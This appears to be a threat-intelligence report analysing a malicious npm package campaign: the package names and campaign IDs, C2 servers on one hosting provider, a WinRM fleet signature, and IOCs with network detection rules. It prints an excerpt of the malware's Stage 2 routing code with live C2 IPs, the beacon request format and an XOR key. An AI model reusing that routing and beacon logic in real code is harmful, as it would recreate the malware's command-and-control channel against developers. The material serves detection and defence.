# Task AZ: A6 Campaign Scope + 23.27.13.43 C2 Analysis

**Date:** 2026-07-23  
**Reference:** `OVERVIEW_C2_INFRASTRUCTURE.md`, `ANALYSIS_F5F0_STAGE2.md`, `ANALYSIS_BA_CHAINVEIL_NPM.md`

---

## Summary

The A6 campaign series consists entirely of the 9 ChainVeil npm packages documented in
`ANALYSIS_BA_CHAINVEIL_NPM.md` — there are no additional GitHub victim repos discoverable
with A6 campaign IDs (GitHub code search: 0 hits for A6-317, A6-318, A6-420, A6-519).
The A6 victims were served by `23.27.13.43`, a dedicated C2 on AS149440 (Evoxt Sdn. Bhd.)
that appeared in the Jun 20 Stage 2 routing table and was silently dropped Jun 25. The Shodan
scan of all known C2 IPs reveals a **fleet-wide WinRM signature** (port 5985 open on 4 of 6
IPs) and confirms nginx + Node.js + Express + MongoDB as the C2 stack.

---

## 1. A6 Campaign Scope

### GitHub search results

Code search for `"A6-317"`, `"A6-318"`, `"A6-420"`, `"A6-519"` across all of GitHub returned
**0 hits**. All A6-series payloads are compiled/obfuscated and embedded in npm tarballs which
have been deleted; no plain-text campaign IDs survive in any indexed repository.

### A6 victim mapping (complete)

| Campaign ID | Package | Version | Publish date |
|-------------|---------|---------|--------------|
| A6-317 | tailwindcss-animatics | 1.0.1 | 2026-05-19 07:18 UTC |
| A6-318 | tailwindcss-animates-kit | 1.0.1 | 2026-05-19 07:24 UTC |
| A6-420 | clsx-tailwind or tailwindcss-merge (early Jun 7 version) | 1.0.1 | 2026-06-07 |
| A6-519-79 | sass-formats | 1.0.2 | 2026-06-07 03:09 UTC (**confirmed**) |
| A6-519-81 | sass-formats | 1.0.3 | 2026-06-07 03:26 UTC |
| A6-519-83 | sass-formats | 1.0.4 | 2026-06-07 03:34 UTC |
| A6-519-85 | sass-formats | 1.0.5 | 2026-06-07 05:19 UTC |
| A6-420-# | sass-format, rate-limit-flexible, rate-limits-flexible, typeorm-encrypt | Jun 7–10 batch | variant |

Dragon-Lady tracked exactly 8 distinct IDs (A6-317, A6-318, A6-420, A6-420-#,
A6-519-79/81/83/85). The 9 packages produce ≥8 distinct IDs because the A6-420 slot covers
multiple packages and some packages shared an ID (same payload template per session).

**A6 victim count:** Minimum 8 distinct campaign IDs. Number of actual developer installs unknown
— npm download statistics unavailable post-takedown. Given the packages target
`tailwind-merge` (very high download volume) and `rate-limiter-flexible`, potential reach was
significantly higher than the astro victim cluster.

---

## 2. 23.27.13.43 — Full C2 Analysis

### Role in the campaign

`23.27.13.43` served as the **dedicated C2 handler for all A-prefix victims** in the Jun 20
Stage 2 build. It was referenced in the W2 Stage 2 string table (`_$_a478`) only, and removed
from routing 5 days later.

**Stage 2 routing code (Jun 20 build):**

```javascript
var r = global['_V'] || 0;

if (r[0] == 'A') {
    global['_H2'] = 'http://23.27.13.43';        // A6, A8, A-prefix victims
} else if (!isNaN(parseInt(r))) {
    global['_H2'] = 'http://198.105.127.210';     // numeric victims → production
} else {
    global['_H']  = 'http://198.105.127.210';     // N-N-NNN format
    global['_H2'] = 'http://23.27.202.27:27017';  // MongoDB fallback
}
// Beacon: GET (_H || _H2) + '/$/boot'
// Header: Sec-V: <campaign_id>
// Response XOR key: 'ThZG+0jfXE6VAGOJ'
```

**Jun 25 Stage 2 (`_$_d6e0`):** The `r[0] == 'A'` branch is replaced with `return` (silent
drop). `23.27.13.43` disappears from the routing table entirely. All A-prefix victims
(A6, A8, A9, etc.) receive no Stage 3 response after this date.

### Network fingerprint

| Field | Value |
|-------|-------|
| IP | `23.27.13.43` |
| ASN | **AS149440 Evoxt Sdn. Bhd.** |
| Country | GB (London) |
| Open ports (Shodan) | **80** (nginx/1.30.2), **5985** (WinRM) |
| HTTP response (live probe) | Timeout / no response (server offline or firewalled) |
| HTTPS | No response |

### ASN confirmation

Every known PolinRider C2 IP is on **AS149440 Evoxt Sdn. Bhd.** — confirming `23.27.13.43`
as campaign infrastructure:

| IP | Ports (Shodan) | Role |
|----|---------------|------|
| `198.105.127.210` | 80, 443, **5985**, 27017 | Production handler (primary) |
| `166.88.134.62` | **5985** | Admin/A-prefix (Stage 1 routing; current) |
| `166.88.54.158` | (none visible) | Unknown / backup |
| `23.27.202.27` | **5985** | MongoDB backend / HTTP fallback |
| `23.27.13.43` | 80, **5985** | A-prefix handler (Jun 20–25 only) |
| `136.0.9.8` | (none visible) | Unknown / standby |

All on AS149440. The actor has exclusively used Evoxt as their hosting provider.

### C2 stack (from Shodan, `198.105.127.210`)

```
nginx/1.28.0           → reverse proxy (port 80 HTTP, port 443 HTTPS)
Node.js + Express.js   → C2 application layer
MongoDB                → port 27017 (victim tracking, command queue, data exfil store)
WinRM                  → port 5985 (actor remote administration — see below)
```

Tag: `eol-product` on `198.105.127.210` — Shodan flags an end-of-life software version.
This is an OPSEC weakness: the production C2 server runs unsupported software.

---

## 3. WinRM Fleet Signature

Port 5985 (WinRM HTTP, Windows Remote Management) is open on **4 of 6 known C2 IPs**:
`198.105.127.210`, `166.88.134.62`, `23.27.202.27`, and `23.27.13.43`.

WinRM on 5985 indicates:
1. The C2 infrastructure runs **Windows** (WinRM is a native Windows service)
2. The actor remotely manages all servers via **PowerShell Remoting** over WinRM

This is operationally significant:
- The Stage 3 backdoor (`socket.io` C2 client) has `ss_eval:` and shell execution commands.
  Victim beaconing to a Windows C2 server creates a consistent Windows + PowerShell operator
  environment for post-exploitation interaction.
- WinRM traffic (TCP 5985, plaintext HTTP transport) is detectable on network egress — any
  outbound connection to port 5985 at these IPs is a high-confidence PolinRider indicator.

**Network detection signature (WinRM):**
```
TCP dst_port=5985 AND dst_ip IN {
  198.105.127.210, 166.88.134.62, 23.27.202.27, 23.27.13.43
}
```

---

## 4. A-Prefix Routing Timeline

The handling of A-prefix victims changed three times:

| Period | A-prefix handler | Stage 2 build |
|--------|-----------------|---------------|
| Pre-Jun 20 | `166.88.134.62:443` | Earlier `_$_9f51` Stage 2 |
| Jun 20 Stage 2 | `23.27.13.43:80` | `_$_a478` |
| Jun 25 Stage 2+ | Silent drop (`return`) | `_$_d6e0` |

The shift from `166.88.134.62` to `23.27.13.43` (Jun 20) then to silent drop (Jun 25) tracks
exactly with the campaign wind-down: W3 silent Jun 8, W2 silent Jun 20, W1 silent Jun 23,
`23.27.13.43` dropped Jun 25. Each step reduces the actor's active attack surface.

The silent drop on Jun 25 means all A-prefix victims (including any A6 npm installs still
running their Stage 1 on a compromised machine) receive no Stage 3 payload from that date.
Existing Stage 3 backdoor connections (already-beaconed victims) remain until evicted.

---

## 5. IOC Summary

### C2 infrastructure

| IOC | Type | Notes |
|-----|------|-------|
| `23.27.13.43` | IP | A-prefix C2 handler; offline; AS149440 |
| `AS149440` | ASN | Evoxt Sdn. Bhd.; all 6 PolinRider C2 IPs; exclusive hosting provider |
| Port 5985 (WinRM) | Port | Fleet-wide signature; 4 of 6 C2 IPs |
| Port 27017 (MongoDB) | Port | Backend on 198.105.127.210 and 23.27.202.27 |

### Network detections

```
# A6/A8/A-prefix C2 beacon (historical — server now offline)
GET /$/boot HTTP/1.1
Host: 23.27.13.43
Sec-V: A6-519-79   (or A6-317, A6-318, A6-420, etc.)

# WinRM fleet detection (all PolinRider C2 IPs)
TCP dst_port=5985 dst_ip ∈ {198.105.127.210, 166.88.134.62, 23.27.202.27, 23.27.13.43}

# Production C2 beacon (still active as of last check)
GET /$/boot HTTP/1.1
Host: 198.105.127.210
Sec-V: <numeric_campaign_id>
Header User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...
```

---

## 6. Open Questions

- **A6-420 exact mapping**: Which package(s) carry campaign ID `A6-420` and `A6-420-#`?
  Likely `clsx-tailwind` (Jun 7, 07:47 UTC) and/or early `tailwindcss-merge` versions.
  Cannot confirm without payload.

- **`166.88.54.158` and `136.0.9.8`**: No open ports visible on Shodan. May be standby/
  reserve servers, decommissioned, or firewalled. Both on AS149440.

- **MongoDB exposure**: Port 27017 is open on `198.105.127.210`. If authentication is
  misconfigured (common with self-hosted MongoDB), the victim database may be accessible
  without credentials — a potential intelligence source. Not tested.

---

## Related Documents

- `ANALYSIS_BA_CHAINVEIL_NPM.md` — Full A6 npm package analysis
- `ANALYSIS_F5F0_STAGE2.md` — Jun 20 vs Jun 25 Stage 2 routing diff
- `OVERVIEW_C2_INFRASTRUCTURE.md` — Full C2 infrastructure registry
- `ANALYSIS_AH_THZG_KEY.md` — `ThZG+0jfXE6VAGOJ` Stage 3 XOR key; A-prefix routing
- `CAMPAIGN_MASTER.md` §5 — C2 infrastructure summary table
